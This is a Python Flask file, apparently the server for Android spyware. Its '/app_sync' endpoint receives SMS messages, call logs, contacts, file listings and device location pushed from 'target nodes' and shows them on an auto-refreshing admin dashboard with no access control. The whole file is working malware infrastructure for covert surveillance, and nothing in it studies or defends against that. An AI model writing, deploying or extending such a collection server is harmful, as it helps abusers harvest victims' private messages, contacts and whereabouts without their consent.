import os
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)
# سارا ڈیٹا اس ڈکشنری میں محفوظ ہوگا
database = {}

# پرو لیول ڈیزائن
UI_DESIGN = """
<!DOCTYPE html>
<html>
<head>
    <title>ULTRA-CORE ADMIN V2</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
        .sidebar { border-right: 1px solid #0f0; height: 90vh; overflow-y: auto; }
        .main-content { padding: 10px; }
        .card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; cursor: pointer; border-radius: 5px; }
        .card:hover { border-color: #0f0; background: #050505; }
        .data-section { background: #050505; border: 1px solid #111; padding: 15px; margin-bottom: 20px; border-radius: 10px; }
        .title { color: #fff; font-weight: bold; border-bottom: 1px solid #0f0; margin-bottom: 10px; display: block; }
        pre { white-space: pre-wrap; word-wrap: break-word; font-size: 13px; color: #0f0; }
        .status { color: yellow; font-size: 12px; }
    </style>
    <script>
        setInterval(() => { location.reload(); }, 20000); // 20 سیکنڈ بعد آٹو ریفریش
    </script>
</head>
<body>
    <h1>🛰️ ULTRA-CORE MANAGEMENT SYSTEM</h1>
    <div class="grid">
        <div class="sidebar">
            <h3>TARGET NODES</h3>
            {% for id, data in database.items() %}
            <div class="card">
                <b>{{ data.model }}</b><br>
                <span class="status">LAST SYNC: {{ data.time }}</span>
            </div>
            {% endfor %}
        </div>
        <div class="main-content">
            {% for id, data in database.items() %}
            <div class="data-section">
                <span class="title">📍 DEVICE INFO & LOCATION</span>
                <pre>{{ data.info }}</pre>
            </div>
            <div class="data-section">
                <span class="title">📩 SMS MESSAGES (ALL)</span>
                <pre>{{ data.sms }}</pre>
            </div>
            <div class="data-section">
                <span class="title">📞 CALL HISTORY</span>
                <pre>{{ data.calls }}</pre>
            </div>
            <div class="data-section">
                <span class="title">👤 CONTACTS LIST</span>
                <pre>{{ data.contacts }}</pre>
            </div>
            <div class="data-section">
                <span class="title">📁 FILE SYSTEM (DOWNLOADS)</span>
                <pre>{{ data.files }}</pre>
            </div>
            <hr color="#0f0">
            {% endfor %}
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(UI_DESIGN, database=database)

@app.route('/app_sync', methods=['POST'])
def sync_data():
    try:
        content = request.json
        dev_id = content.get("device_id", "Unknown")
        database[dev_id] = {
            "model": content.get("model", "Android"),
            "time": datetime.now().strftime("%H:%M:%S"),
            "sms": content.get("sms", "No Data"),
            "calls": content.get("calls", "No Data"),
            "contacts": content.get("contacts", "No Data"),
            "files": content.get("files", "No Data"),
            "info": content.get("info", "No Data")
        }
        return jsonify({"status": "Success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
